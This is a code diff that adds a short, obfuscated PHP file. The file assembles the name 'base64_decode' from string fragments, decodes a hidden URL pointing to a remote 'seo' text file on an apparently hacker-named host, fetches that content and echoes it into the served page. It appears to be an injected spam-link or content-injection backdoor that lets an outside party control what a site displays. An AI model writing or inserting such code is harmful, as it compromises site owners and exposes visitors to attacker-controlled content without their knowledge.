@@ -1,0 +1,6 @@
+<?php 
+$baseeeeeeeeeeeee = 'ba'.'se'. 128/2 .'_' .'de'.'co'.'de';
+$variablee = file_get_contents($baseeeeeeeeeeeee("aHR0cHM6Ly9oNGNrbGlua2VyLmdpdGh1Yi5pby9zZW8vc2VvLnR4dA=="));
+$metin = iconv('UTF-8','UTF-8',$variablee);
+echo $metin;
+?>
